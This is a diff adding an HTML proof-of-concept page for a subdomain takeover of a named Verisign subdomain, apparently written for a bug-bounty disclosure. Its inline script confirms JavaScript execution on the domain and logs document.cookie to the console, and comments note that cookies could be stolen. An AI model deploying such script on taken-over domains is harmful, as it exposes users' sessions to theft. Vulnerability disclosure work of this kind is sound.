@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+  <html>
+  <head>
+      <title>Subdomain Takeover PoC</title>
+  </head>
+  <body>
+      <h1>Verisign Subdomain Takeover</h1>
+      <p>This subdomain (domains-india.verisign.com) is vulnerable to a subdomain takeover.</p>
+      <p><strong>Proof of Concept by:</strong> krimxpotato</p>
+
+      <script>
+          // Prove we can execute JavaScript on a *.verisign.com domain
+          // This proves we could steal cookies or bypass CORS if we wanted to
+          alert("XSS Execution Confirmed on " + document.domain);
+
+          // Log the cookies to the console (Safe Harbor compliant)
+          console.log("Accessible Cookies: " + document.cookie);
+      </script>
+  </body>
+  </html>
